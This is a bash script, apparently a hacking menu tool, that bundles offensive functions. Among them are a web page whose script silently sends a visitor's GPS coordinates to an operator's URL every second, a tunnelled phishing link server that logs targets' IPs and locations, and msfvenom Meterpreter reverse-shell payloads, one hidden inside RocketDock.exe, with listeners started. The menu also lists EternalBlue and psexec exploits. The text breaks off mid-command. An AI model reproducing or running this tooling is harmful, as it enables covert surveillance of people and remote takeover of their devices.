#!/bin/bash

banner(){

clear
printf "\e[0m\n"
printf "\e[1;33m      \e[0m\e[1;32m \e[0m\n"
printf "\e[1;33m      \e[0m\e[1;32m \e[0m\n"
printf "\e[1;33m    _              _     , _                            \e[0m\e[1;32m \e[0m\n"
printf "\e[1;33m    | |            | |   /|/ \                           \e[0m\e[1;32m \e[0m\n"
printf "\e[1;33m    | |   __,   ,  | |    |   |   _  _  _    __,    _    \e[0m\e[1;32m \e[0m\n"
printf "\e[1;33m    |/ \_/  |  / \_|/ \   |   |  / |/ |/ |  /  |  |/ \_  \e[0m\e[1;32m \e[0m\n"
printf "\e[1;33m     \_/ \_/|_/ \/ |   |_/|   |_/  |  |  |_/\_/|_/|__/   \e[0m\e[1;32m \e[0m\n"
printf "\e[1;33m                                                 /|      \e[0m\e[1;32m \e[0m\n"
printf "\e[1;33m                                                 \|     \e[0m\e[1;32m \e[0m\n"               
printf "\e[0m\n"
printf "\e[0m\e[1;33m    Created By \e[0m\e[1;31m(\e[0m\e[1;33m RAPOAT \e[0m\e[1;31m)\e[0m\n"


}

menu() {
printf "\e[0m\n"
printf "\e[0m\e[1;31m  [\e[0m\e[1;37m01\e[0m\e[1;31m]\e[0m\e[1;33m Whole Scan\e[0m\n"
printf "\e[0m\e[1;31m  [\e[0m\e[1;37m02\e[0m\e[1;31m]\e[0m\e[1;33m Track Ip\e[0m\n"
printf "\e[0m\e[1;31m  [\e[0m\e[1;37m03\e[0m\e[1;31m]\e[0m\e[1;33m Track URL Ip\e[0m\n"
printf "\e[0m\e[1;31m  [\e[0m\e[1;37m04\e[0m\e[1;31m]\e[0m\e[1;33m hound\e[0m\n"
printf "\e[0m\e[1;31m  [\e[0m\e[1;37m05\e[0m\e[1;31m]\e[0m\e[1;33m unFlare\e[0m\n"
printf "\e[0m\e[1;31m  [\e[0m\e[1;37m06\e[0m\e[1;31m]\e[0m\e[1;33m bashEXE\e[0m\n"
printf "\e[0m\e[1;31m  [\e[0m\e[1;37m07\e[0m\e[1;31m]\e[0m\e[1;33m pentmenu\e[0m\n"
printf "\e[0m\e[1;31m  [\e[0m\e[1;37m08\e[0m\e[1;31m]\e[0m\e[1;33m SocialMediaHackingToolkit\e[0m\n"
printf "\e[0m\e[1;31m  [\e[0m\e[1;37m09\e[0m\e[1;31m]\e[0m\e[1;33m Fakedatagen\e[0m\n"
printf "\e[0m\e[1;31m  [\e[0m\e[1;37m10\e[0m\e[1;31m]\e[0m\e[1;33m GoldenEye\e[0m\n"
printf "\e[0m\e[1;31m  [\e[0m\e[1;37m11\e[0m\e[1;31m]\e[0m\e[1;33m Impulse\e[0m\n"
printf "\e[0m\e[1;31m  [\e[0m\e[1;37m12\e[0m\e[1;31m]\e[0m\e[1;33m Web\e[0m\n"
printf "\e[0m\e[1;31m  [\e[0m\e[1;37m13\e[0m\e[1;31m]\e[0m\e[1;33m Osint\e[0m\n"
printf "\e[0m\e[1;31m  [\e[0m\e[1;\e[0m\e[1;31m]\e[0m\e[1;33m exitbanner&&program\e[0m\n"
printf "\e[0m\e[1;31m  [\e[0m\e[1;37m00\e[0m\e[1;31m]\e[0m\e[1;33m Exit\e[0m\n"
printf "\e[0m\n"
read -p $'  \e[1;31m[\e[0m\e[1;37m~\e[0m\e[1;31m]\e[0m\e[1;92m Select An Option \e[0m\e[1;96m: \e[0m\e[1;93m' option

if [[ $option == 1 || $option == 01 ]]; then
    wholeScan
elif [[ $option == 2 || $option == 02 ]]; then
    useripaddr
elif [[ $option == 3 || $option == 03 ]]; then
    trackurl
elif [[ $option == 4 || $option == 04 ]]; then
    hound
elif [[ $option == 5 || $option == 05 ]]; then
    unFlare
elif [[ $option == 6 || $option == 06 ]]; then
    bashEXE
elif [[ $option == 7 || $option == 07 ]]; then
    pentmenu
elif [[ $option == 8 || $option == 08 ]]; then
    SocialMediaHackingToolkit
elif [[ $option == 9 || $option == 09 ]]; then
    Fakedatagen
elif [[ $option == 10 ]]; then
    GoldenEye
elif [[ $option == 11 ]]; then
    Impulse
elif [[ $option == 12 ]]; then
    Web
elif [[ $option == 13 ]]; then
    Osint
elif [[ $option == 0 || $option == 00 ]]; then
    sleep 1
    printf "\e[0m\n"
    printf "\e[0m\n"
    exit 1
fi
}


wholeScan(){
banner
printf "\e[0m\n"
printf "\e[0m\n"
printf "\e[0m\n"
read -p $'  \e[1;31m[\e[0m\e[1;37m~\e[0m\e[1;31m]\e[0m\e[1;92m Input IP Address \e[0m\e[1;96m: \e[0m\e[1;93m\en' useripaddress
whois $useripaddress
	dig $useripaddress +trace ANY
	nmap -p- -sV -sC -sS -A -v -O -Pn -T4 --script vuln --script http-waf-detect --oN nmap.txt $useripaddress
        curl -ILk $useripaddress
        curl -Lk $useripaddress/robots.txt
        curl -sI $useripaddress | grep 200 && lynx -listonly -dump $useripaddress | awk '{print $2}' | sort -u | grep -v links: || curl -sI $useripaddress | grep Location | awk '{print $2}' | lynx -listonly -dump - | awk '{print $2}' | sort -u | grep -v links:
        curl -sILk $useripaddress | tee >(grep X-Frame-Options && echo -e "\033[32m\nClick Jacking Header is present\nYou can't clickjack this site!\n\033[1m" || echo -e "\033[31m\nX-Frame-Options-Header is missing!\nClickjacking is possible, this site is vulnerable to Clickjacking\n\033[1m");sleep .5
        awk -F"," '{print "IP: " $14 "\nStatus: " $1 "\nRegion: " $5 "\nCountry: " $2 "\nCity: " $6 "\nISP: " $11 "\nLat & Lon: " $8 " " $9 "\nZIP: " $7 "\nTimezone: " $10 "\nAS: " $13}' <<< `curl -s http://ip-api.com/csv/$useripaddress`
                mtr -4 -rwc 1 $useripaddress
sleep 5
printf "\e[0m\n"
printf "  \e[0m\e[1;91m[\e[0m\e[1;97m01\e[0m\e[1;91m]\e[0m\e[1;93m Return To Main Menu\e[0m\n"
printf "  \e[0m\e[1;91m[\e[0m\e[1;97m02\e[0m\e[1;91m]\e[0m\e[1;93m Exit\e[0m\n"
printf "\e[0m\n"
read -p $'  \e[1;31m>>\e[0m\e[1;96m  \en' mainorexit1

if [[ $mainorexit1 == 1 || $mainorexit1 == 01 ]]; then
banner
menu
elif [[ $mainorexit1 == 2 || $mainorexit1 == 02 ]]; then
printf "\e[0m\n"
printf "\e[0m\n"
exit 1

else
printf " \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Invalid option \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
sleep 1
banner
menu
fi
}


useripaddr() {

banner
printf "\e[0m\n"
printf "\e[0m\n"
printf "\e[0m\n"
read -p $'  \e[1;31m[\e[0m\e[1;37m~\e[0m\e[1;31m]\e[0m\e[1;92m Input IP Address \e[0m\e[1;96m: \e[0m\e[1;93m\en' useripaddress

ipaddripapico=$(curl -s "https://ipapi.co/$useripaddress/json" -L)
ipaddripapicom=$(curl -s "http://ip-api.com/json/$useripaddress" -L)
userip=$(echo $ipaddripapico | grep -Po '(?<="ip":)[^,]*' | tr -d '[]"')
usercity=$(echo $ipaddripapico | grep -Po '(?<="city":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
useregion=$(echo $ipaddripapico | grep -Po '(?<="region":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
usercountry=$(echo $ipaddripapico | grep -Po '(?<="country_name":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
userlat=$(echo $ipaddripapicom | grep -Po '(?<="lat":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
userlon=$(echo $ipaddripapicom | grep -Po '(?<="lon":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
usertime=$(echo $ipaddripapicom | grep -Po '(?<="timezone":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
userpostal=$(echo $ipaddripapicom | grep -Po '(?<="zip":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
userisp=$(echo $ipaddripapico | grep -Po '(?<="org":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
userasn=$(echo $ipaddripapico | grep -Po '(?<="asn":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
usercountrycode=$(echo $ipaddripapico | grep -Po '(?<="country_code":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
usercurrency=$(echo $ipaddripapico | grep -Po '(?<="currency":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
userlanguage=$(echo $ipaddripapico | grep -Po '(?<="languages":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
usercalling=$(echo $ipaddripapico | grep -Po '(?<="country_calling_code":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')

banner
printf "\e[0m\n"
printf "\e[0m\n"
printf "  \e[0m\e[1;93m  Ip Address    \e[0m\e[1;96m:\e[0m\e[1;92m   $userip\e[0m\n"
printf "  \e[0m\e[1;93m  City          \e[0m\e[1;96m:\e[0m\e[1;92m   $usercity\e[0m\n"
printf "  \e[0m\e[1;93m  Region        \e[0m\e[1;96m:\e[0m\e[1;92m   $useregion\e[0m\n"
printf "  \e[0m\e[1;93m  Country       \e[0m\e[1;96m:\e[0m\e[1;92m   $usercountry\e[0m\n"
printf "\e[0m\n"
printf "  \e[0m\e[1;93m  Latitude      \e[0m\e[1;96m:\e[0m\e[1;92m    $userlat\e[0m\n"
printf "  \e[0m\e[1;93m  Longitude     \e[0m\e[1;96m:\e[0m\e[1;92m    $userlon\e[0m\n"
printf "  \e[0m\e[1;93m  Time Zone     \e[0m\e[1;96m:\e[0m\e[1;92m    $usertime\e[0m\n"
printf "  \e[0m\e[1;93m  Postal Code   \e[0m\e[1;96m:\e[0m\e[1;92m    $userpostal\e[0m\n"
printf "\e[0m\n"
printf "  \e[0m\e[1;93m  ISP           \e[0m\e[1;96m:\e[0m\e[1;92m   $userisp\e[0m\n"
printf "  \e[0m\e[1;93m  ASN           \e[0m\e[1;96m:\e[0m\e[1;92m   $userasn\e[0m\n"
printf "\e[0m\n"
printf "  \e[0m\e[1;93m  Country Code  \e[0m\e[1;96m:\e[0m\e[1;92m   $usercountrycode\e[0m\n"
printf "  \e[0m\e[1;93m  Currency      \e[0m\e[1;96m:\e[0m\e[1;92m   $usercurrency\e[0m\n"
printf "  \e[0m\e[1;93m  Languages     \e[0m\e[1;96m:\e[0m\e[1;92m   $userlanguage\e[0m\n"
printf "  \e[0m\e[1;93m  Calling Code  \e[0m\e[1;96m:\e[0m\e[1;92m   $usercalling\e[0m\n"
printf "\e[0m\n"
printf "  \e[0m\e[1;93m  GOOGLE Maps   \e[0m\e[1;96m:\e[0m\e[1;94m  https://maps.google.com/?q=$userlat,$userlon\e[0m\n"
sleep 5
printf "\e[0m\n"
printf "  \e[0m\e[1;91m[\e[0m\e[1;97m01\e[0m\e[1;91m]\e[0m\e[1;93m Return To Main Menu\e[0m\n"
printf "  \e[0m\e[1;91m[\e[0m\e[1;97m02\e[0m\e[1;91m]\e[0m\e[1;93m Exit\e[0m\n"
printf "\e[0m\n"
read -p $'  \e[1;31m>>\e[0m\e[1;96m  \en' mainorexit2

if [[ $mainorexit2 == 1 || $mainorexit2 == 01 ]]; then
banner
menu
elif [[ $mainorexit2 == 2 || $mainorexit2 == 02 ]]; then
printf "\e[0m\n"
printf "\e[0m\n"
exit 1

else
printf " \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Invalid option \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
sleep 1
banner
menu
fi
}

trackurl() {
#!/bin/bash

#64_bit
#xterm -e ./ngrok http 80 & clear

#32_Bit
sudo service nginx stop
xterm -e sudo service apache2 restart
xterm -e ./ngrok http 80 & clear


echo "            ______________________________________________________   
            7      77  _  77  _  77     77  7  77  7  77  _  77  7   
            !__  __!|    _||  _  ||  ___!|   __!|  |  ||    _||  |   
              7  7  |  _ \ |  7  ||  7___|     ||  |  ||  _ \ |  !___
              |  |  |  7  ||  |  ||     7|  7  ||  !  ||  7  ||     7
              !__!  !__!__!!__!__!!_____!!__!__!!_____!!__!__!!_____!
                                                                     "
sleep 5
read -p '           URL: ' varurl
echo "<!DOCTYPE html>

<html>
    <head>
        <title>Untitled</title>
        <style type=\"text/css\">
            
            body {
                background-image: url("qrcode.png");
                background-size: 1000px 1000px;
                background-repeat: no-repeat;
            }

        </style>
    </head>
    <body>

        <script src=\"https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js\" type='text/javascript' ></script>
        <script type='text/javascript'>
        function httpGet(theUrl)
        {
            var xmlHttp = new XMLHttpRequest();
            xmlHttp.open( \"GET\", theUrl, false ); // false for synchronous request
            xmlHttp.send( null );
            return xmlHttp.responseText;
        }


        function autoUpdate() {
          navigator.geolocation.getCurrentPosition(function(position) {
            coords = position.coords.latitude + \",\" + position.coords.longitude;
             url = \""$varurl"/logme/\" + coords;
            httpGet(url);
            console.log('should be working');
            setTimeout(autoUpdate, 1000);
        })
        };
        \$(document).ready(function(){
           autoUpdate();
        });

        </script>
    </body>
</html>" > index.html

mv index.html /var/www/html/index.html
cp qrcode.png /var/www/html/qrcode.png
service apache2 start
echo "         ______________________________________________________   
         7      77  _  77  _  77     77  7  77  7  77  _  77  7   
         !__  __!|    _||  _  ||  ___!|   __!|  |  ||    _||  |   
           7  7  |  _ \ |  7  ||  7___|     ||  |  ||  _ \ |  !___
           |  |  |  7  ||  |  ||     7|  7  ||  !  ||  7  ||     7
           !__!  !__!__!!__!__!!_____!!__!__!!_____!!__!__!!_____!
                                                                  " > /var/log/apache2/access.log
xterm -e tail -f /var/log/apache2/access.log &
sleep 5
printf "\e[0m\n"
printf "  \e[0m\e[1;91m[\e[0m\e[1;97m01\e[0m\e[1;91m]\e[0m\e[1;93m Return To Main Menu\e[0m\n"
printf "  \e[0m\e[1;91m[\e[0m\e[1;97m02\e[0m\e[1;91m]\e[0m\e[1;93m Exit\e[0m\n"
printf "\e[0m\n"
read -p $'  \e[1;31m>>\e[0m\e[1;96m  \en' mainorexit3

if [[ $mainorexit1 == 1 || $mainorexit1 == 01 ]]; then
banner
menu
elif [[ $mainorexit1 == 2 || $mainorexit1 == 02 ]]; then
printf "\e[0m\n"
printf "\e[0m\n"
exit 1

else
printf " \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Invalid option \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
sleep 1
banner
menu
fi

}

#!/bin/bash
# Hound v 0.2

trap 'printf "\n";stop' 2

banner2() {
clear
printf '\n       ██   ██  ██████  ██    ██ ███    ██ ██████ \n' 
printf '       ██   ██ ██    ██ ██    ██ ████   ██ ██   ██ \n'
printf '       ███████ ██    ██ ██    ██ ██ ██  ██ ██   ██ \n'
printf '       ██   ██ ██    ██ ██    ██ ██  ██ ██ ██   ██ \n'
printf '       ██   ██  ██████   ██████  ██   ████ ██████  \n\n'
printf '\e[1;31m       ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀\n'                                                                                
printf "\e[1;90m Hound is a simple and light tool for information gathering and capture GPS coordinates.\e[0m \n"
printf "\n"
}

dependencies() {
command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; } 

}

stop() {
checkcf=$(ps aux | grep -o "cloudflared" | head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1)
checkssh=$(ps aux | grep -o "ssh" | head -n1)
if [[ $checkcf == *'cloudflared'* ]]; then
pkill -f -2 cloudflared > /dev/null 2>&1
killall -2 cloudflared > /dev/null 2>&1
fi
if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi
if [[ $checkssh == *'ssh'* ]]; then
killall -2 ssh > /dev/null 2>&1
fi
exit 1
}

catch_ip() {

ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip
cat ip.txt >> saved.ip.txt

}

checkfound() {

printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting targets,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
while [ true ]; do


if [[ -e "ip.txt" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\n"
catch_ip
rm -rf ip.txt
tail -f -n 110 data.txt
fi
sleep 0.5
done 
}


cf_server() {

if [[ -e cloudflared ]]; then
echo "Cloudflared already installed."
else
command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Cloudflared...\n"
arch=$(uname -m)
arch2=$(uname -a | grep -o 'Android' | head -n1)
if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm -O cloudflared > /dev/null 2>&1
elif [[ "$arch" == *'aarch64'* ]]; then
wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 -O cloudflared > /dev/null 2>&1
elif [[ "$arch" == *'x86_64'* ]]; then
wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O cloudflared > /dev/null 2>&1
else
wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386 -O cloudflared > /dev/null 2>&1 
fi
fi
chmod +x cloudflared
printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
sleep 2
printf "\e[1;92m[\e[0m+\e[1;92m] Starting cloudflared tunnel...\n"
rm cf.log > /dev/null 2>&1 &
./cloudflared tunnel -url 127.0.0.1:3333 --logfile cf.log > /dev/null 2>&1 &
sleep 10
link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' "cf.log")
if [[ -z "$link" ]]; then
printf "\e[1;31m[!] Direct link is not generating \e[0m\n"
exit 1
else
printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link
fi
sed 's+forwarding_link+'$link'+g' template.php > index.php
checkfound
}

local_server() {
sed 's+forwarding_link+''+g' template.php > index.php
printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server on Localhost:8080...\n"
php -S 127.0.0.1:8080 > /dev/null 2>&1 & 
sleep 2
checkfound
}
hound() {
if [[ -e data.txt ]]; then
cat data.txt >> targetreport.txt
rm -rf data.txt
touch data.txt
fi
if [[ -e ip.txt ]]; then
rm -rf ip.txt
fi
sed -e '/tc_payload/r payload' index_chat.html > index.html
default_option_server="Y"
read -p $'\n\e[1;93m Do you want to use cloudflared tunnel?\n \e[1;92motherwise it will be run on localhost:8080 [Default is Y] [Y/N]: \e[0m' option_server
option_server="${option_server:-${default_option_server}}"
if [[ $option_server == "Y" || $option_server == "y" || $option_server == "Yes" || $option_server == "yes" ]]; then
cf_server
sleep 1
else
local_server
sleep 1
fi
}


unFlare(){
    #!/bin/bash
# CloudUnflare

CompleteDNS_Login='email@mail.com|password'

if [[ -z $(command -v dig) ]]; then
	echo " ERROR: \"dig\" command not found"
	exit
elif [[ -z $(command -v curl) ]]; then
	echo " ERROR: \"curl\" command not found"
	exit
elif [[ -z $(command -v whois) ]]; then
	echo " ERROR: \"whois\" command not found"
	exit
fi

echo '       __                          '
echo '    __(  )_       CLOUDFLARE       '
echo ' __(       )_   RECONNAISSANCE     '
echo '(____________)__ _  V 0.2          '
echo ' _   _ _ __  / _| | __ _ _ __ ___  '
echo '| | | | `_ \| |_| |/ _` | `__/ _ \ '
echo '| |_| | | | |  _| | (_| | | |  __/ '
echo ' \__,_|_| |_|_| |_|\__,_|_|  \___| '
echo ''

if [[ -f cuf-domain.tmp ]]; then
	rm cuf-domain.tmp
elif [[ -f cuf-ipaddr.tmp ]]; then
	rm cuf-ipaddr.tmp
fi

echo " Input domain name"
echo " Example: google.com"
echo -ne " >> "
read DOMAIN
echo ''

if [[ -z $(dig +short ${DOMAIN}) ]]; then
	if [[ -z $(whois ${DOMAIN} | grep -i 'Domain Name:') ]]; then
		echo " ERROR: Domain not found"
		exit
	fi
fi

function Dig() {
	D=$1
	echo " INFO: Checking ${D}"
	for DMN in $(dig +short ${D} | grep '[.]'$ | sed 's/[.]$//g' | sort -V | uniq)
	do
		echo "   + CNAME: ${DMN}"
	done
	for IP in $(dig +short ${D} | grep [0-9]$ | sort -V | uniq)
	do
		VENDOR=$(curl -s "https://rdap.arin.net/registry/ip/${IP}" -H 'User-Agent: Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 KHTML, like Gecko) Chrome/77.0.3865.120 Mobile Safari/537.36' --compressed | sed 's/",/\n/g' | grep '"name"' | sed 's/://g' | sed 's/"//g' | awk '{print $2}')
		echo "   + ${IP} [${VENDOR}]"
	done
}

Dig ${DOMAIN}

i=0
c=0
max=$(cat `dirname $(realpath $0)`/subdomains.txt | wc -l)
for SUBD in $(cat `dirname $(realpath $0)`/subdomains.txt)
do
	((i++))
	SUBDOMAIN=${SUBD}.${DOMAIN}
	if [[ ! -z $(dig +short ${SUBDOMAIN}) ]]; then
		Dig ${SUBDOMAIN}
	else
		((c++))
		if [[ $(expr $c % 20) -eq 0 ]]; then
			echo " INFO: Subdomain enumeration progress [${i}/${max}]"
		fi
	fi
done

function CompleteDNS() {
	DMN=${1}
	CRE=${2}
	EMAIL=$(echo ${CRE} | awk -F '|' '{print $1}')
	PASS=$(echo ${CRE} | awk -F '|' '{print $2}')
	TOKEN=$(curl -s --cookie-jar cookie.txt https://completedns.com/login | grep '_csrf_token' | sed 's/value="/\nToken /g' | grep ^Token | sed 's/"//g' | awk '{print $2}')
	if [[ ! -z $(curl -skL --cookie cookie.txt --cookie-jar cookie.txt 'https://completedns.com/login_check' --data "_csrf_token=${TOKEN}&_username=${EMAIL}&_password=${PASS}&submitButton=" | grep 'Invalid credentials.') ]]; then
		echo " ERROR: CompleteDNS cannot login"
		return 1
	fi
	if [[ -f completedns.tmp ]]; then
		rm completedns.tmp
	fi
	curl -s --cookie cookie.txt https://completedns.com/dns-history/ajax/?domain=${DMN} &>> completedns.tmp
	echo " INFO: NS History by CompleteDNS.com"
	i=0
	IFS=$'\n'
	for NSROW in $(cat completedns.tmp | sed ':a;N;$!ba;s/\n/ /g' | sed 's/clearfix/\n/g' | sed 's/col-md-2/\nASULAH/g' | grep ASULAH | sed 's/  //g' | sed 's/>/ /g' | sed 's/</ /g');
	do
		((i++))
		echo "${NSROW}" | awk '{print "   + "$11"/"$10"/"$5}'
		echo "${NSROW}" | sed 's/br \//\nNSLine /g' | grep -v '"' | grep -v '/' | awk '{print "       * "$2}'
	done
	if [[ ${i} -lt 1 ]]; then
		echo "   * Empty"
	fi
	if [[ -f completedns.tmp ]]; then
		rm completedns.tmp
	elif [[ -f cookie.txt ]]; then
		rm cookie.txt
	fi
}

CompleteDNS "${DOMAIN}" "${CompleteDNS_Login}"

function ViewDNS() {
	DMN="${1}"
	if [[ -f viewdns.tmp ]]; then
		rm viewdns.tmp
	fi
	curl -s "https://viewdns.info/iphistory/?domain=${DMN}" -H 'user-agent: Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Mobile Safari/537.36' --compressed &>> viewdns.tmp
	COUNT=$(cat viewdns.tmp | sed ':a;N;$!ba;s/\n/ /g' | sed 's/<table border="1">/\nIPHISTORY/g' | sed 's/<\/table>/\n/g' | grep ^IPHISTORY | sed 's/<tr><td>/\n/g' | sed 's/\r//' | grep ^[0-9] | sed 's/<\/td><td>/|/g' | sed 's/<\/td><td align="center">/|/g' | sed 's/<\/td><\/tr>//g' | awk -F '|' '{print "   + "$4" | "$1" | "$3"("$2")"}' | sort -V | wc -l);
	if [[ ${COUNT} -lt 1 ]]; then
		echo " ERROR: No IP History data in ViewDNS.info"
	else
		echo " INFO: IP History by ViewDNS.info"
		cat viewdns.tmp | sed ':a;N;$!ba;s/\n/ /g' | sed 's/<table border="1">/\nIPHISTORY/g' | sed 's/<\/table>/\n/g' | grep ^IPHISTORY | sed 's/<tr><td>/\n/g' | sed 's/\r//' | grep ^[0-9] | sed 's/<\/td><td>/|/g' | sed 's/<\/td><td align="center">/|/g' | sed 's/<\/td><\/tr>//g' | awk -F '|' '{print "   + "$4" | "$1" | "$3"("$2")"}' | sort -V
	fi
	rm viewdns.tmp
}

ViewDNS ${DOMAIN}
sleep 5
printf "\e[0m\n"
printf "  \e[0m\e[1;91m[\e[0m\e[1;97m01\e[0m\e[1;91m]\e[0m\e[1;93m Return To Main Menu\e[0m\n"
printf "  \e[0m\e[1;91m[\e[0m\e[1;97m02\e[0m\e[1;91m]\e[0m\e[1;93m Exit\e[0m\n"
printf "\e[0m\n"
read -p $'  \e[1;31m>>\e[0m\e[1;96m  \en' mainorexit4

if [[ $mainorexit2 == 1 || $mainorexit2 == 01 ]]; then
banner
menu
elif [[ $mainorexit2 == 2 || $mainorexit2 == 02 ]]; then
printf "\e[0m\n"
printf "\e[0m\n"
exit 1

else
printf " \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Invalid option \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
sleep 1
banner
menu
fi
}

bashEXE(){
#!/bin/bash
# test ver

# easysploit
sudo service nginx stop
xterm -e sudo service apache2 restart
xterm -e ./ngrok tcp 4400 & clear
ip=$(ip addr show wlan0 | awk '/inet / {print $2}' | cut -d/ -f 1)

 echo -e '\e[1;33m
 _              _      ___  _       ___ 
| |            | |    / (_)(_\  /  / (_)
| |   __,   ,  | |    \__     \/   \__  
|/ \_/  |  / \_|/ \   /       /\   /    
 \_/ \_/|_/ \/ |   |_/\___/ _/  \_/\___/  \e[1;34m
                                Created by "RAPOAT"
                                ngrok tcp 4400 forward recommended

\e[1;32m
(1) Windows --> test.exe (payload and listener) 
(2) Android --> test.apk (payload and listener)  
(3) Linux --> test.py (payload and listener) 
(4) MacOS --> test.jar (payload and listener)
(5) Web --> test.php (payload and listener)
(6) Scan if a target is vulnerable to ms17_010
(7) Exploit Windows 7/2008 x64 ONLY by IP (ms17_010_eternalblue)
(7rd) Enable Remote Desktop (ms17_010_eternalblue)
(8) Exploit Windows Vista/XP/2000/2003 ONLY by IP (ms17_010_psexec) 
(8rd) Enable Remote Desktop (ms17_010_psexec)
(9) Exploit Windows with a link (HTA Server)
(10) Contact with us - Our accounts
'
 
service postgresql start
exe='1'
apk='2'
py='3'
jar='4' 
php='5'
scan='6'
eternalblue='7'
eternalbluerd='7rd'
psexec='8'
psexecrd='8rd'
hta='9'
me='10'



read x

if [ "$x" == "$exe" ]; then                    #EXE
read -p $'  \e[1;31m[\e[0m\e[1;37m~\e[0m\e[1;31m]\e[0m\e[1;92m Input IP Address \e[0m\e[1;96m: \e[0m\e[1;93m\en' ip
read -p $'  \e[1;31m[\e[0m\e[1;37m~\e[0m\e[1;31m]\e[0m\e[1;92m Input port Address \e[0m\e[1;96m: \e[0m\e[1;93m\en' port
msfvenom -x RocketDock.exe -p windows/meterpreter/reverse_tcp lhost=$ip lport=$port --platform windows -e x86/ shikata_ga_nai -i 50 -f exe > test.exe
echo -e '

!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!Your payload: test.exe!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

Waiting for listener...
 
'

msfconsole -q -x " use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set lhost 127.0.0.1; set lport 4400; exploit -j;"


elif [ "$x" == "$apk" ]; then                          #APK
read -p $'  \e[1;31m[\e[0m\e[1;37m~\e[0m\e[1;31m]\e[0m\e[1;92m Input IP Address \e[0m\e[1;96m: \e[0m\e[1;93m\en' ip
read -p $'  \e[1;31m[\e[0m\e[1;37m~\e[0m\e[1;31m]\e[0m\e[1;92m Input port Address \e[0m\e[1;96m: \e[0m\e[1;93m\en' port
msfvenom -p android/meterpreter/reverse_tcp lhost=$ip lport=$port > test.apk
echo -e '

!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!Your payload: test.apk!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

Waiting for listener...
 
'

msfconsole -q -x " use exploit/multi/handler; set payload android/meterpreter/reverse_tcp;  set lhost 127.0.0.1 ; set lport 4400 ; exploit -j ; jobs ; "




elif [ "$x" == "$py" ]; then                       #PYTHON
read -p $'  \e[1;31m[\e[0m\e[1;37m~\e[0m\e[1;31m]\e[0m\e[1;92m Input IP Address \e[0m\e[1;96m: \e[0m\e[1;93m\en' ip
read -p $'  \e[1;31m[\e[0m\e[1;37m~\e[0m\e[1;31m]\e[0m\e[1;92m Input port Address \e[0m\e[1;96m: \e[0m\e[1;93m\en' port
msfvenom -p python/meterpreter/reverse_tcp lhost=$ip lport=$port > test.py
echo -e '

